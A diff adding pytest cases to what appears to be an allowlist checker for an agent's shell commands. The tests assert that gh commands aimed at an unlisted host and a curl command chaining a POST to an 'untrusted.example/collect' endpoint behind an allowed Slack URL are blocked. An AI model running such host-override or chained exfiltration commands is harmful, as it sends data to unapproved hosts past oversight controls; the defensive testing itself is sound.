@@ -281,6 +281,34 @@ def test_gh_write_short_circuit_does_not_leak_to_non_gh(
     assert r.host_or_label == "nothing.example.com"
 
 
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "GH_HOST=untrusted.example gh issue create --title x",
+        "gh api --hostname untrusted.example -X POST /repos/a/b/issues -f title=x",
+        "gh -R untrusted.example/a/b issue create --title x",
+    ],
+)
+def test_gh_write_explicit_host_override_requires_allowlist(
+    cmd: str, allowlist_full: R.AllowlistSnapshot
+) -> None:
+    r = R.evaluate_bash(cmd, allowlist=allowlist_full)
+    assert r.outcome == "block"
+    assert r.host_or_label == "untrusted.example"
+
+
+def test_every_write_url_must_be_allowlisted(
+    allowlist_full: R.AllowlistSnapshot,
+) -> None:
+    r = R.evaluate_bash(
+        "curl -X POST https://slack.com/api --next "
+        "https://untrusted.example/collect -d text=hello",
+        allowlist=allowlist_full,
+    )
+    assert r.outcome == "block"
+    assert r.host_or_label == "untrusted.example"
+
+
 def test_gh_read_still_never_writes(allowlist_full: R.AllowlistSnapshot) -> None:
     """`gh pr view/list/diff/checkout/watch` are reads — `is_bash_write` is False.
 
